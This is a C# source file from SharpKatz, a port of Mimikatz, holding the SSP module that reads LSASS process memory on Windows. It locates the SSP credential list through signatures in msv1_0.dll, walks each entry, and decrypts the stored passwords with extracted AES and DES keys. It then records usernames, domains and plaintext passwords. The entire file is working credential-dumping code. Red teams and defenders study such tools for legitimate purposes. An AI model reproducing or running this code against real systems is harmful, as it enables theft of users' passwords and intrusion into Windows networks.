//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class Ssp
    {

        static long max_search_size = 200000;

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_SSP_CREDENTIAL_LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public uint References;
            public uint CredentialReferences;
            public LUID LogonId;
            public uint unk0;
            public uint unk1;
            public uint unk2;
            public Msv1.KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
        };

        public static int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
            IntPtr sspCredentialListAddr;
            IntPtr llCurrent;
            string passDecrypted = "";
            
            sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, "msv1_0.dll", max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);

            //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());

            llCurrent = sspCredentialListAddr;

            do
            {
                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Marshal.SizeOf(typeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                entry = Utility.ReadStruct<KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);

                string username = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.UserName);
                string domain = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.Domaine);
                int reference = (int)entry.References;

                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.credentials.Password.Buffer, entry.credentials.Password.MaximumLength);

                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                /*Console.WriteLine("LUID " + entry.LogonId.LowPart);
                 Console.WriteLine("References " + entry.References);
                 Console.WriteLine("CredentialReferences " + entry.CredentialReferences);
                 Console.WriteLine("Uusername {1} {0}", username, entry.credentials.UserName.MaximumLength);
                Console.WriteLine("Udomain {1} {0}", domain, entry.credentials.Domaine.MaximumLength);
                Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    LUID luid = entry.LogonId;

                    Credential.Ssp sspentry = new Credential.Ssp();
                    sspentry.Reference = reference; 
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "[NULL]";
                    }
                    
                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;

                    }
                    else
                    {
                        sspentry.Password = "[NULL]";
                    }

                    Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;
                        currentlogon.Ssp = new List<Credential.Ssp>();
                        currentlogon.Ssp.Add(sspentry);
                        logonlist.Add(currentlogon);
                    }
                    else
                    {
                        if (currentlogon.Ssp == null)
                            currentlogon.Ssp = new List<Credential.Ssp>();

                        currentlogon.Ssp.Add(sspentry);
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
